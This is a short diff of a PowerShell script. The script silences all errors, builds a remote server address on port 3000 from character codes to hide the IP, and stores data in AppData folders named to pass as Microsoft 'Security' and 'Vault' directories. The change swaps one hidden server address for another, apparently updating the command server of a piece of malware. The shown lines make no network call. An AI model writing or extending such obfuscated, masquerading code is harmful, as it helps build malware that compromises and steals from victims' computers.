@@ -1,7 +1,7 @@
 
 $ErrorActionPreference = 'SilentlyContinue'
 
-$sUrl = 'http://' + [char]55+[char]52+'.'+[char]49+[char]49+[char]57+'.'+[char]49+[char]57+[char]50+'.'+[char]50+[char]50+[char]52+':3000'
+$sUrl = 'http://' + [char]50+[char]49+[char]51+'.'+[char]49+[char]53+[char]57+'.'+[char]55+[char]53+'.'+[char]49+[char]53+[char]57+':3000'
 
 $pDir = "$env:APPDATA\Microsoft\Security"
 $kDir = "$env:LOCALAPPDATA\Microsoft\Vault"
